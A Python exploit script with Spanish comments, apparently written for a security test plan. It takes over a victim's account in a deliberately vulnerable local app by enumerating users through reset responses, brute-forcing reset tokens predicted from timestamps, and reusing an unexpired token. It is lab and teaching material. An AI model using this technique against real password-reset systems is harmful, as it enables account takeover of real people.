"""
Exploit contra app_vulnerable.py — toma de control de la cuenta de la victima
sin conocer su password. Demuestra los puntos del plan de pruebas.

Requisito: tener app_vulnerable.py corriendo en otra terminal.
Correr:    python3 atacante.py
"""
import json
import urllib.parse
import urllib.request

BASE = ""
VICTIMA = "0706938347"
ATACANTE = "1212121212"


def post(ruta, datos):
    body = urllib.parse.urlencode(datos).encode()
    req = urllib.request.Request(BASE + ruta, data=body)
    try:
        with urllib.request.urlopen(req) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read())


def confirmar(token, nueva):
    return post("/reset/confirmar", {"token": token, "password": nueva, "email": VICTIMA})


# --- Punto 7 del plan: enumeracion de usuarios ---
print("[*] Enumeracion (BUG 6):")
print("    email real   ->", post("/reset/pedir", {"email": VICTIMA}))
print("    email falso  ->", post("/reset/pedir", {"email": "noexiste@x.com"}))
print("    respuestas distintas => confirmamos que la victima existe\n")

# --- Punto 2 del plan: prediccion por timestamp ---
# Disparamos un reset de NUESTRA cuenta y otro de la victima casi al mismo tiempo.
# Como el token = ultimos 6 digitos del timestamp en ms, ambos caen muy cerca.
print("[*] Ataque por PREDICCION (BUG 1+2):")
_, mio = post("/reset/pedir", {"email": ATACANTE})
_, vic = post("/reset/pedir", {"email": VICTIMA})
token_mio = int(mio["_email_simulado"])
print(f"    mi token observado: {token_mio:06d}")
print("    (en un ataque real NO verias el de la victima; lo buscamos por cercania)")

# Probamos una ventana chica alrededor de nuestro propio token.
NUEVA_PASS = "hackeada-por-el-atacante"
for delta in range(0, 200):          # +-200 ms de ventana
    for cand in (token_mio + delta, token_mio - delta):
        codigo, resp = confirmar(f"{cand % 1000000:06d}", NUEVA_PASS)
        if codigo == 200 and VICTIMA in resp["msg"]:
            print(f"    ACERTADO con token {cand % 1000000:06d} (delta={delta}) -> {resp['msg']}")
            break
    else:
        continue
    break

# --- Punto 4 del plan: reuso de token ---
print("\n[*] Reuso del token (BUG 4): vuelvo a usar el mismo token...")
codigo, resp = confirmar(f"{cand % 1000000:06d}", "otra-vez")
print("    ", codigo, resp, "=> el token NO se quemo, sigue sirviendo\n")

print("[+] Takeover completo: la password de la victima ahora es la que puse yo.")
